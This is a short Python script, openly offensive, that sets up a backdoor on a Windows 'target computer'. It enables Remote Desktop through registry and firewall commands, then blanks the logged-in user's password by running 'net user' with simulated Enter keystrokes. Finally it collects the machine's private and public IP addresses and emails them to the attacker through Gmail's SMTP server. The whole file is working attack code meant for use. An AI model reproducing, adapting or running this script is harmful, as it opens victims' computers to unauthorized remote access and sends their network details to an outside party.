import getpass     #get windows current login users USERNAME
import subprocess  # execute system command 
import pyautogui  # automate keyboard to type the password
import smtplib    #module used to send mails

# THIS COMMAND WILL AUTOMATICALLY ENABLE RDP ON TARGET COMPUTER

subprocess.run("reg add " + '"'+"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"+'" '+"/v fDenyTSConnections /t REG_DWORD /d 0 /f" )
subprocess.run("netsh advfirewall firewall set rule group="+'"'+"remote desktop"+'"'+" new enable=Yes")

#THIS LINES WILL REMOVE PASSWORD OF TARGET COMPUTER FOR U TO CONNEXT TARGET COMPUTER REMOTLY

username = getpass.getuser() 
subprocess.run("net user" + ' "' + username + '"' + " *", shell=True, input=pyautogui.typewrite([ 'enter', 'enter']))

#THIS LINES OF CODE WILL SEND A CONFORMATION EMAIL TO U TELLING THAT RDP IS SUCESSFULLY ENABLED ON TARGET PC AND IP ADDRESS OF TARGET TO CONNECT TO TARGET

private_ip = subprocess.check_output("ipconfig", shell=True)
public_ip = subprocess.check_output("nslookup myip.opendns.com. resolver1.opendns.com", shell=True)
message = "RDP ENABLED on network " + public_ip.decode()+private_ip.decode()
print(message)
s = smtplib.SMTP('smtp.gmail.com', 587)
s.starttls()
s.login("your_email_id", "your_email_id_password")
s.sendmail("sender_email_id", "receiver_email_id", message)
s.quit()